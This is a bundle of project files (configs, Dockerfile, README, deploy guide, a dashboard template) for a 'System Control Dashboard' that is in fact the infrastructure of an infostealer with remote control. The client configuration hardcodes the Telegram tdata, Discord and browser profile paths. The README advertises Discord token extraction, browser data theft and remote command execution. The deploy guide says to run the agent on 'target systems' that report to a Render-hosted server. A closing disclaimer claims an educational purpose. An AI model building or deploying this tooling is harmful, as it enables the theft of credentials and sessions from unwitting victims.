# requirements.txt
Flask==2.3.3
Flask-SocketIO==5.3.6
websockets==11.0.3
requests==2.31.0
psutil==5.9.5
cryptography==41.0.4
pywin32==306; sys_platform == "win32"
python-socketio==5.8.0
python-engineio==4.7.1
Werkzeug==2.3.7
Jinja2==3.1.2
eventlet==0.33.3
gunicorn==21.2.0

---

# render.yaml (for Render deployment)
services:
  - type: web
    name: system-control-dashboard
    env: python
    buildCommand: pip install -r requirements.txt
    startCommand: python server_dashboard.py
    envVars:
      - key: FLASK_ENV
        value: production
      - key: SECRET_KEY
        generateValue: true
      - key: ADMIN_USERNAME
        value: admin
      - key: ADMIN_PASSWORD
        value: your-secure-password-here
      - key: PORT
        value: 10000

---

# Procfile (alternative for Heroku-style deployment)
web: python server_dashboard.py

---

# .env (environment variables template)
FLASK_ENV=production
SECRET_KEY=your-very-secure-secret-key-change-this
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-password
PORT=10000
DATABASE_URL=sqlite:///dashboard.db

---

# gunicorn.conf.py (production WSGI server config)
import os

bind = f"0.0.0.0:{os.environ.get('PORT', 10000)}"
workers = 2
worker_class = "eventlet"
worker_connections = 1000
timeout = 30
keepalive = 5
max_requests = 1000
max_requests_jitter = 50
preload_app = True
accesslog = "-"
errorlog = "-"
loglevel = "info"

---

# docker/Dockerfile (if you prefer Docker deployment)
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements first for better caching
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY . .

# Create upload directory
RUN mkdir -p uploads

# Expose port
EXPOSE 10000

# Set environment variables
ENV FLASK_ENV=production
ENV PORT=10000

# Run the application
CMD ["python", "server_dashboard.py"]

---

# docker-compose.yml (for local development)
version: '3.8'

services:
  dashboard:
    build: .
    ports:
      - "10000:10000"
    environment:
      - FLASK_ENV=development
      - SECRET_KEY=dev-secret-key
      - ADMIN_USERNAME=admin
      - ADMIN_PASSWORD=admin123
      - PORT=10000
    volumes:
      - ./uploads:/app/uploads
      - ./dashboard.db:/app/dashboard.db
    restart: unless-stopped

---

# config.py (configuration management)
import os
from pathlib import Path

class Config:
    """Base configuration"""
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'dev-secret-key-change-in-production'
    DATABASE_PATH = os.environ.get('DATABASE_PATH') or 'dashboard.db'
    UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER') or 'uploads'
    MAX_CONTENT_LENGTH = 500 * 1024 * 1024  # 500MB
    
    # Server settings
    WS_PORT = int(os.environ.get('PORT', 10000))
    DEBUG = os.environ.get('FLASK_ENV') == 'development'
    
    # Authentication
    ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
    
    # Session and client settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour
    CLIENT_TIMEOUT = int(os.environ.get('CLIENT_TIMEOUT', 300))     # 5 minutes
    MAX_CLIENTS = int(os.environ.get('MAX_CLIENTS', 100))
    
    # Data retention
    BACKUP_RETENTION_DAYS = int(os.environ.get('BACKUP_RETENTION_DAYS', 30))
    LOG_RETENTION_DAYS = int(os.environ.get('LOG_RETENTION_DAYS', 7))

class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True
    SECRET_KEY = 'dev-secret-key'

class ProductionConfig(Config):
    """Production configuration"""
    DEBUG = False
    # Use more secure defaults in production

class TestingConfig(Config):
    """Testing configuration"""
    TESTING = True
    DATABASE_PATH = ':memory:'  # Use in-memory database for tests

# Configuration mapping
config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}

---

# startup.sh (startup script for server)
#!/bin/bash

# Startup script for the dashboard server

echo "Starting System Control Dashboard..."

# Set default environment
export FLASK_ENV=${FLASK_ENV:-production}
export PORT=${PORT:-10000}

# Create necessary directories
mkdir -p uploads
mkdir -p logs

# Initialize database if it doesn't exist
if [ ! -f dashboard.db ]; then
    echo "Initializing database..."
    python -c "from server_dashboard import db_manager; db_manager.init_database()"
fi

# Start the server
echo "Starting server on port $PORT..."
python server_dashboard.py

---

# client_config.py (configuration for client)
import os
import platform

class ClientConfig:
    """Client configuration"""
    
    # Server URLs - Update these with your Render app URL
    SERVER_URL = os.environ.get("SERVER_URL", "wss://your-app-name.onrender.com/ws")
    API_URL = os.environ.get("API_URL", "https://your-app-name.onrender.com/api")
    
    # Client identification
    CLIENT_ID = os.environ.get("CLIENT_ID", str(uuid.getnode()))
    CLIENT_NAME = os.environ.get("CLIENT_NAME", platform.node())
    
    # Connection settings
    RECONNECT_DELAY = int(os.environ.get("RECONNECT_DELAY", 5))
    HEARTBEAT_INTERVAL = int(os.environ.get("HEARTBEAT_INTERVAL", 30))
    MAX_FILE_SIZE = int(os.environ.get("MAX_FILE_SIZE", 100 * 1024 * 1024))  # 100MB
    
    # Backup settings
    BACKUP_FORMATS = {
        "compress": os.environ.get("BACKUP_COMPRESS", "true").lower() == "true",
        "encrypt": os.environ.get("BACKUP_ENCRYPT", "true").lower() == "true",
        "split_large_files": os.environ.get("BACKUP_SPLIT", "true").lower() == "true"
    }
    
    # Paths for different applications
    TELEGRAM_PATHS = [
        os.path.expanduser("~/AppData/Roaming/Telegram Desktop/tdata"),
        os.path.expanduser("~/AppData/Local/Telegram Desktop/tdata"),
        "C:\\Users\\*\\AppData\\Roaming\\Telegram Desktop\\tdata",
        "C:\\Users\\*\\AppData\\Local\\Telegram Desktop\\tdata"
    ]
    
    DISCORD_PATHS = [
        os.path.expanduser("~/AppData/Roaming/discord"),
        os.path.expanduser("~/AppData/Local/Discord"),
        "C:\\Users\\*\\AppData\\Roaming\\discord",
        "C:\\Users\\*\\AppData\\Local\\Discord"
    ]
    
    BROWSER_PATHS = {
        "chrome": [
            os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
            "C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data"
        ],
        "edge": [
            os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data"),
            "C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data"
        ],
        "opera": [
            os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable"),
            "C:\\Users\\*\\AppData\\Roaming\\Opera Software\\Opera Stable"
        ],
        "firefox": [
            os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles"),
            "C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        ]
    }

---

# deploy_instructions.md
# Deployment Instructions

## Deploy to Render.com

### Step 1: Prepare Your Code
1. Upload both `client_agent.py` and `server_dashboard.py` to your GitHub repository
2. Include all the configuration files (`requirements.txt`, `render.yaml`, etc.)

### Step 2: Deploy to Render
1. Go to [Render Dashboard](https://dashboard.render.com)
2. Click "New" -> "Web Service"
3. Connect your GitHub repository
4. Configure the service:
   - **Name**: `system-control-dashboard`
   - **Environment**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python server_dashboard.py`
   - **Instance Type**: Choose based on your needs (Starter is fine for testing)

### Step 3: Set Environment Variables
In the Render dashboard, add these environment variables:
- `FLASK_ENV`: `production`
- `SECRET_KEY`: (generate a secure random key)
- `ADMIN_USERNAME`: `admin` (or your preferred username)
- `ADMIN_PASSWORD`: (set a secure password)
- `PORT`: `10000`

### Step 4: Deploy
Click "Create Web Service" and wait for deployment to complete.

### Step 5: Update Client Configuration
Once deployed, update your client configuration:
1. Get your Render app URL (e.g., `https://your-app-name.onrender.com`)
2. Update the URLs in `client_agent.py`:
   ```python
   CONFIG = {
       "SERVER_URL": "wss://your-app-name.onrender.com/ws",
       "API_URL": "https://your-app-name.onrender.com/api",
       # ... other config
   }
   ```

### Step 6: Run Client
On your target systems, run:
```bash
python client_agent.py
```

Or for standalone backup:
```bash
python client_agent.py --standalone
```

## Security Considerations

1. **Change Default Credentials**: Always change the default admin password
2. **Use HTTPS**: Render provides HTTPS by default
3. **Secure File Storage**: Files are stored on the server - consider encryption for sensitive data
4. **Network Security**: Use firewall rules to restrict access if needed
5. **Regular Updates**: Keep dependencies updated

## Monitoring

1. Check Render logs for server issues
2. Monitor client connections in the dashboard
3. Set up alerts for failed backups
4. Regular cleanup of old data

## Troubleshooting

### Common Issues:
1. **WebSocket Connection Failed**: Check server URL and firewall settings
2. **File Upload Errors**: Verify file size limits and permissions
3. **Database Errors**: Check disk space on Render
4. **Authentication Issues**: Verify username/password configuration

### Logs:
- Server logs: Available in Render dashboard
- Client logs: Check `system_agent.log` on client systems

---

# README.md
# System Control Dashboard

A powerful remote system monitoring and backup solution with web-based management.

## Features

### Client Agent (`client_agent.py`)
- **Comprehensive System Information**: Hardware, software, network details
- **Browser Data Extraction**: Chrome, Edge, Opera, Firefox support
- **Telegram Backup**: Complete tdata folder backup
- **Discord Data**: Tokens and configuration extraction
- **File System Scanning**: Smart file discovery and categorization
- **Real-time Communication**: WebSocket-based remote control
- **Automated Backups**: Scheduled and on-demand backup creation

### Server Dashboard (`server_dashboard.py`)
- **Web Interface**: Modern responsive dashboard
- **Real-time Monitoring**: Live client status and system metrics
- **Remote Command Execution**: Send commands to connected clients
- **Backup Management**: View, download, and manage backups
- **File Storage**: Secure file upload and storage system
- **Multi-user Support**: Authentication and session management

## Quick Start

### 1. Deploy Server to Render
```bash
# Clone repository
git clone <your-repo>
cd system-control-dashboard

# Deploy to Render (see deploy_instructions.md)
```

### 2. Configure Client
```bash
# Update server URLs in client_agent.py
python client_agent.py --server-url wss://your-app.onrender.com/ws
```

### 3. Access Dashboard
Open `https://your-app.onrender.com` and login with your credentials.

## Architecture

```
┌─────────────────┐     WebSocket/HTTP     ┌─────────────────┐
│   Client Agent │ ◄──────────────────────► │ Server Dashboard│
│                 │                        │                 │
│ • Data Extract  │                        │ • Web Interface │
│ • File Backup   │                        │ • Command Queue │
│ • System Info   │                        │ • File Storage  │
│ • Remote Control│                        │ • Database      │
└─────────────────┘                        └─────────────────┘
```

## Configuration

### Server Environment Variables
```bash
SECRET_KEY=your-secure-secret-key
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-password
PORT=10000
DATABASE_PATH=dashboard.db
```

### Client Configuration
```python
CONFIG = {
    "SERVER_URL": "wss://your-app.onrender.com/ws",
    "API_URL": "https://your-app.onrender.com/api",
    "CLIENT_ID": "unique-client-id",
    # ... other settings
}
```

## Security

- HTTPS/WSS encryption for all communications
- Authentication required for web access
- File upload size limits
- Session timeout protection
- SQL injection protection
- XSS protection via templating

## License

This project is for educational and authorized system administration purposes only. 
Ensure you have proper authorization before deploying on any systems.

---

# Additional Templates (continued)

# clients.html
{% extends "base.html" %}

{% block title %}Clients - System Control Dashboard{% endblock %}
{% block header %}Clients Management{% endblock %}

{% block content %}
<div class="row mb-3">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <h5>All Clients</h5>
                <button class="btn btn-primary" onclick="refreshClients()">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-striped">
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>Client ID</th>
                                <th>Name</th>
                                <th>Hostname</th>
                                <th>OS</th>
                                <th>First Seen</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for client in clients %}
                            <tr id="client-{{ client.id }}">
                                <td>
                                    <span class="badge {{ 'bg-success' if client.is_online else 'bg-danger' }}">
                                        {{ 'Online' if client.is_online else 'Offline' }}
                                    </span>
                                </td>
                                <td>
                                    <span class="font-monospace">{{ client.id[:12] }}...</span>
                                </td>
                                <td>{{ client.name }}</td>
                                <td>{{ client.hostname }}</td>
                                <td>{{ client.os_info }}</td>
                                <td>{{ client.first_seen }}</td>
                                <td>{{ client.last_seen }}</td>
                                <td>
                                    <div class="btn-group" role="group">
                                        <a href="{{ url_for('client_detail', client_id=client.id) }}" 
                                           class="btn btn-sm btn-outline-primary">
                                            <i class="fas fa-eye"></i>
                                        </a>
                                        {% if client.is_online %}
                                        <button class="btn btn-sm btn-outline-success" 
                                                onclick="sendCommand('{{ client.id }}', 'get_system_info')">
                                            <i class="fas fa-info"></i>
                                        </button>
                                        <button class="btn btn-sm btn-outline-warning" 
                                                onclick="sendCommand('{{ client.id }}', 'create_backup')">
                                            <i class="fas fa-archive"></i>
                                        </button>
                                        {% endif %}
                                    </div>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
function refreshClients() {
    location.reload();
}

function sendCommand(clientId, commandType) {
    const commands = {
        'get_system_info': { type: 'get_system_info' },
        'create_backup': { type: 'create_backup', upload: true }
    };
    
    const command = commands[commandType];
    if (!command) return;
    
    fetch(`/api/client/${clientId}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(command)
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert(`Command sent successfully! Command ID: ${data.command_id}`);
        } else {
            alert(`Error: ${data.message}`);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending command');
    });
}

// Auto-refresh every 30 seconds
setInterval(refreshClients, 30000);
</script>
{% endblock %}